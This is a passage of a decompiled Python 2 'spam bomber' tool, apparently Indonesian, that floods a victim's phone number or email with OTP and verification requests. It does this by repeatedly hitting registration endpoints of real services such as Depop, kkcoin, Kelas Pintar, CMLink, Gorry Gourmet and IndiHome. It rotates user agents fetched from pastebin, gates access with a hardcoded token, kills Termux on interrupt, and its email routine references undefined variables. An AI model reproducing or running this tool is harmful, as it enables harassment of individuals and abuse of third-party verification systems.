            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        bkm()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def rp():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        rp()
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    dt = {'mobile': no, 'noise': '1583590641573155574', 'request_time': '158359064157312', 'access_token': '11111'}
    data = json.dumps(dt)
    r = requests.Session()
    for spam in range(3):
        try:
            a = r.post('https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code', headers={'accept': 'text/html, application/xhtml+xml, application/json, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-length': '166', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://h5.rupiahcepatweb.com', 'referer': 'https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': '{acak}'}, data={'data': data}).text
            b = json.loads(a)['code']
            if b == 0:
                print '\n%s[%s*%s] %sSukses spam ke %s' % (W1, G1, W1, W0, no)
                wait(60)
            else:
                print '\n%s[%s*%s] %sGagal spam ke %s' % (W1, R1, W1, W0, no)
                wait(60)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        rp()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def kk():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        kk()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        kk()
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    hd = {'Host': 'www.kkcoin.com', 'cache-control': 'max-age=0', 'save-data': 'on', 'upgrade-insecure-requests': '1', 'user-agent': '{acak}', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://www.kkcoin.com/phone/get_phone_code?mobile_country=62&mobile=' + no + '&type=5', headers=hd)
            if 'Invalid Request' in a.text:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(1)
            elif 'Please try again in 1' in a.text:
                print '\n%s[%s%s%s] %sTunggu 1 menit' % (W1, R1, z, W1, W0)
                wait(60)
            else:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(1)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            exit()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        kk()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def dp():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        dp()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        dp()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Content-Length': '49', 'Accept': 'application/json, text/plain, */*', 'Origin': 'https://signup.depop.com', 'Save-Data': 'on', 'User-Agent': '{acak}', 'Content-Type': 'application/json', 'Referer': 'https://signup.depop.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    at = {'phone_number': no, 'country_code': 'ID'}
    dt = json.dumps(at)
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.put('https://webapi.depop.com/api/auth/v1/verify/phone', headers=hd, data=dt)
            if 'false' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        dp()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def kpt():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        kpt()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        kpt()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    hd = {'content-length': '62', 'accept': 'application/json, text/javascript, */*; q=0.01', 'origin': 'https://www.kelaspintar.id', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.kelaspintar.id/', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://www.kelaspintar.id/user/otpverification', headers=hd, data={'user_mobile': no, 'otp_type': 'send_otp_reg', 'mobile_code': '+62'})
            if 'successfully' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            exit()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        kpt()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def cml():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        cml()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        cml()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    hd = {'content-length': '83', 'accept': 'application/json, text/javascript, */*; q=0.01', 'origin': 'https://global.cmlink.com', 'save-data': 'on', 'user-agent': '{acak}', 'content-type': 'application/json', 'referer': 'https://global.cmlink.com/global/pc/views/register.html', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    n = 104
    at = {'accountName': no, 'accountType': n, 'serviceType': '104', 'language': '0'}
    dt = json.dumps(at)
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://global.cmlink.com/aep/APP_getVerificationCode_SBO/v1', headers=hd, data=dt)
            if 'success' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            exit()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        cml()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def gry():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        gry()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        gry()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    hd = {'Connection': 'keep-alive', 'Content-Length': '23', 'Cache-Control': 'max-age=0', 'Origin': 'https://gorrygourmet.com', 'Upgrade-Insecure-Requests': '1', 'Content-Type': 'application/x-www-form-urlencoded', 'Save-Data': 'on', 'user-agent': '{acak}', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Referer': 'https://gorrygourmet.com/registration/verification-otp', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://gorrygourmet.com/register/set-otp', headers=hd, data={'phoneNumber': no})
            if 'dikirimkan' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            exit()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        gry()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def email():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: emailkorban@gmail.com\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        email()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        email()
    print
    r = requests.Session()
    z = 0
    head = {'Connection': 'keep-alive', 'Content-Length': '39', 'Accept': '*/*', 'Origin': 'https://sobat.indihome.co.id', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://sobat.indihome.co.id/register', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://sobat.indihome.co.id/ajaxreg/emailGetOtp', headers=head, data={'type': 'email', 'email': mel})
            if 'Kode verifikasi telah dikirim ke email Anda' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, mel)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, mel)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        email()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def logo():
    os.system('clear')
    ketik('\n%s _____               %s__     %s_______\n|     \\%s .---.-.----.|  |--.%s|     __|%s.-----.---.-.--------.\n%s|  --  %s|%s|  _  |   _||    < %s|__     |%s|  _  |  _  |        |\n%s|_____/ %s|___._|__|  |__|__|%s|_______|%s|   __|___._|__|__|__|\n                                    %s|__|      v0.8\n' % (G1, W1, G1, W1, G1, W1, G1, G1, W1, G1, W1, G1, W1, G1, W1, W1))


def menu():
    print '%s{%s01%s} %sSpam AYO SRC\t\t%s{%s16%s} %sSpam JET\n%s{%s02%s} %sSpam Airbnb\t\t%s{%s17%s} %sSpam Depop\n%s{%s03%s} %sSpam OLX\t\t\t%s{%s18%s} %sSpam Cmlink\n%s{%s04%s} %sSpam Mister Aladin\t\t%s{%s19%s} %sSpam Sooplai\n%s{%s05%s} %sSpam Three\t\t\t%s{%s20%s} %sSpam Tiket\n%s{%s06%s} %sSpam OYO\t\t\t%s{%s21%s} %sSpam Pomona\n%s{%s07%s} %sSpam Codapay\t\t%s{%s22%s} %sSpam Payfazz\n%s{%s08%s} %sSpam MAPCLUB\t\t%s{%s23%s} %sSpam Rework\n%s{%s09%s} %sSpam Gojek\t\t\t%s{%s24%s} %sSpam Gorry\n%s{%s10%s} %sSpam Rupa Rupa\t\t%s{%s25%s} %sSpam Qikcircle\n%s{%s11%s} %sSpam Indihome\t\t%s{%s26%s} %sSpam Kkoin\n%s{%s12%s} %sSpam PHD\t\t\t%s{%s27%s} %sSpam Ace\n%s{%s13%s} %sSpam Kelas pintar\t\t%s{%s28%s} %sSpam Bakmi Gm\n%s{%s14%s} %sSpam Redbus\n%s{%s15%s} %sSpam Shopback\n%s{%s99%s} %sBack\t\t\t%s{%s00%s} %sExit' % (W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, R1, W1, R0, W1, R1, W1, R0)


def ct():
    koneksi()
    os.system('git pull')
    time.sleep(3)
    logo()
    print '%s[%s1%s] %sHajar\n%s[%s2%s] %sUpdate\n%s[%s3%s] %sGet token\n%s[%s4%s] %sReport bug (Whatsapp)\n%s[%s5%s] %sAbout\n%s[%s0%s] %sExit' % (W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, R1, W1, R0)
    su = ['1', '2', '3', '4', '5', '0']
    wa = raw_input('\n%s\xe2\x95\x94%s[%sD4RK5H4D0W5%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s[%sChoice%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))
    while wa not in su:
        logo()
        print '%s[%s1%s] %sHajar\n%s[%s2%s] %sUpdate\n%s[%s3%s] %sGet token\n%s[%s4%s] %sReport bug (Whatsapp)\n%s[%s5%s] %sAbout\n%s[%s0%s] %sExit' % (W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, R1, W1, R0)
        print '\n%s[%sx%s] %sPilihan Anda salah' % (W0, R0, W0, R0)
        wa = raw_input('%s\xe2\x95\x94%s[%sD4RK5H4D0W5%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s[%sChoice%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))

    if wa == '1':
        while True:
            logo()
            print '%s[%s#%s] %sWelcome' % (G1, Y1, G1, W0)
            print '%s[%s#%s] %sKalo gak tau tokennya nya pilih menu Get token' % (G1, Y1, G1, W0)
            try:
                e = getpass('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mEnter Token : ')
                if e == 'dark4434524b53483444305753spam':
                    print '\x1b[1;32m[\x1b[1;33m\xe2\x88\x9a\x1b[1;32m] \x1b[0;37mLogin success'
                    time.sleep(1)
                    break
                    main1()
                else:
                    print '\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mWrong Password'
                    time.sleep(1)
            except Exception:
                print '\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mWrong Password'
                time.sleep(1)
            except KeyboardInterrupt:
                os.system('killall -9 com.termux')
                print '\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mWrong Password'
                time.sleep(1)

        os.system('clear')
    elif wa == '2':
        koneksi()
        os.system('git pull')
        print '%s[%s+%s] %sTools was updated. \xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf' % (W1, P1, W1, W0)
        exit()
    elif wa == '3':
        koneksi()
        print '%s[%s*%s] %sMakasih bro dah use tool gw :)' % (W1, G1, W1, W0)
        time.sleep(4)
        print '%s[%s*%s] %sTunggu, Anda akan di alihkan ke browser' % (W1, G1, W1, W0)
        time.sleep(3)
        os.system('xdg-open https://shtlink.pw/oP9hg')
        ct()
    elif wa == '4':
        koneksi()
        logo()
        time.sleep(1)
        chat = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mEnter your message : ')
        chat.replace(' ', '%20')
        spin()
        try:
            sp.check_output(['am', 'start', 'https://api.whatsapp.com/send?phone=628996604524&text=Report : ' + chat + ''])
        except:
            metu()

        ct()
    elif wa == '5':
        print '%s[%s#%s] %sAuthor : D4RK5H4D0W5\n%s[%s#%s] %sThx to : \n%s[%s#%s] %sAllah\n%s[%s#%s] %sOfficial Offensive Security Ghost\n%s[%s#%s] %sAnd you' % (G1, Y1, G1, W0, G1, Y1, G1, W0, G1, Y1, G1, W0, G1, Y1, G1, W0, G1, Y1, G1, W0)
    elif wa == '0':
        print
        metu()


def main1():
    try:
        logo()
        print '%s[%s1%s] %sSpam Call\n%s[%s2%s] %sSpam WA\n%s[%s3%s] %sSpam Sms\n%s[%s4%s] %sBack\n%s[%s0%s] %sExit\n' % (W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, R0)
        coi = raw_input('%s\xe2\x95\x94%s[%sD4RK5H4D0W5%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s[%sChoice%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))
        mer = ['1', '2', '3', '4', '0']
        while coi not in mer:
            logo()
            print '%s[%s1%s] %sSpam Call\n%s[%s2%s] %sSpam WA\n%s[%s3%s] %sSpam Sms\n%s[%s4%s] %sBack\n%s[%s0%s] %sExit\n' % (W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, R0)
            print '%s[%sx%s] %sPilihan Anda salah' % (W0, R1, W0, R0)
            coi = raw_input('%s\xe2\x95\x94%s[%sD4RK5H4D0W5%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s[%sChoice%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))

        if coi == '1' or coi == '01':
            call()
        elif coi == '2' or coi == '02':
            bos()
        elif coi == '3' or coi == '03':
            main2()
        elif coi == '4' or coi == '04':
            ct()
        elif coi == '0':
            print
            metu()
    except KeyboardInterrupt:
        print
        metu()


def main2():
    try:
        logo()
        menu()
        no = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '01', '02', '03', '04', '05', '06', '07', '08', '09', '0', '00', '99']
        pilih = raw_input('\n%s\xe2\x95\x94%s[%sD4RK5H4D0W5%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s[%sChoice%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))
        while pilih not in no:
            logo()
            menu()
            print '\n%s[%sx%s] %sPilihan Anda salah' % (W0, R1, W0, R0)
            pilih = raw_input('%s\xe2\x95\x94%s[%sD4RK5H4D0W5%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90%s[%sChoice%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))

        if pilih == '1' or pilih == '01':
            src()
        elif pilih == '2' or pilih == '02':
            air()
        elif pilih == '3' or pilih == '03':
            olx()
        elif pilih == '4' or pilih == '04':
            ald()
        elif pilih == '5' or pilih == '05':
            tri()
        elif pilih == '6' or pilih == '06':
            oyo()
        elif pilih == '7' or pilih == '07':
            coda()
        elif pilih == '8' or pilih == '08':
            map()
        elif pilih == '9' or pilih == '09':
            gojek()
        elif pilih == '10':
            rupa()
        elif pilih == '11':
            idh()
        elif pilih == '12':
            phd2()
        elif pilih == '13':
            kpt()
        elif pilih == '14':
            red()
        elif pilih == '15':
            shp()
        elif pilih == '16':
            jet()
        elif pilih == '17':
            dp()
        elif pilih == '18':
            cml()
        elif pilih == '29':
            sop()
        elif pilih == '20':
            tkt()
        elif pilih == '21':
            pmn()
        elif pilih == '22':
            pfz()
        elif pilih == '23':
            rwk()
        elif pilih == '24':
            gry()
        elif pilih == '25':
            qcr()
        elif pilih == '26':
            kk()
        elif pilih == '27':
            ace()
        elif pilih == '28':
            bkm()
        elif pilih == '99':
            main1()
        elif pilih == '0' or pilih == '00':
            print
            metu()
    except KeyboardInterrupt:
        print
        metu()


if __name__ == '__main__':
    ct()
    main1()
    main2()

# Decompiled At : Wed Apr  1 13:27:38 2020 
